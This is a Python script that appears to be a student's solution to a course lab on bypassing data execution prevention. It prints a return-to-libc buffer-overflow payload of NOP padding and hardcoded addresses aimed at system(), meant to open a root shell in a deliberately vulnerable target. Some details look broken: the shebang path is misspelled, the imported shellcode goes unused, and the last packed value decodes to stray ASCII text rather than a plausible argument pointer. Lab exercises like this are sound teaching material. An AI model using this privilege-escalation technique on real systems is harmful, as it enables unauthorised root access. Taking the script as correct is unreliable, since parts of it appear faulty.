#!/user/bin/env python3

# target5: Bypassing DEP
# (Difficulty: Medium)
# This program resembles target2, but it has been compiled with data execution prevention (DEP)
# enabled. DEP means that the processor will refuse to execute instructions stored on the stack. You
# can overflow the stack and modify values like the return address, but you can’t jump to any shellcode
# you inject. You need to find another way to run the command /bin/sh and open a root shell.
# What to submit Create a Python program named sol5.py that prints a line to be used as the
# command-line argument to the target. Test your program with the command line:
# ./target5 $(python3 sol5.py)
# For this target, it’s acceptable if the program segfaults after the root shell is closed.

import sys
from shellcode import shellcode
from struct import pack

#print(pack("<I", 0x080518d0))
#print(pack("<I", 0xfffee880))
#print(pack("<I", 0x785c3064))

# 0xfffee870 <---- start of buffer address
# 0xfffee880

padding = 22
for i in range(padding):
  sys.stdout.buffer.write(b"\x90")
sys.stdout.buffer.write(pack("<I", 0x080518d0)) ## start of system call
sys.stdout.buffer.write(pack("<I", 0xfffee880))
sys.stdout.buffer.write(pack("<I", 0x785c3064))

